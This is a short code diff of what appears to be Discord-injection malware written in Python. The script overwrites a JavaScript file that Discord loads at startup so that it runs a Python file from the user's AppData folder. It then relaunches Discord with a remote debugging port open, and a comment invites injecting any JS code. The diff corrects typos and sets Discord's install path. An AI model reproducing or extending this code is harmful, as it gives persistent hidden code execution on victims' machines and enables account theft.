@@ -1,6 +1,6 @@
 import os, shutil, requests
 
-# Other py code needs subprocess so we will install it here
+# Other py code needs subprocess so well install it here
 try:
     import subprocess
 except:
@@ -28,7 +28,8 @@ process.exec('python""" + f" C://Users//{os.getenv('username')}//AppData//Roamin
 });
 """)# ^^This changes the text of a js file discord loads on startup (You could change this to any js code as long as you keep the module.exports part)
     f.close()
-    subprocess.Popen("Discord.exe --remote-debugging-port=420") # Opening wiht debugging port bc it didnt start again without it
+    os.chdir("C://Users//" + str(os.getenv("username")) + "//AppData//Local//Discord//app-0.0.309")
+    subprocess.Popen("Discord.exe --remote-debugging-port=420") # Opening with debugging port bc it didnt start again without it
 
 yes()
 
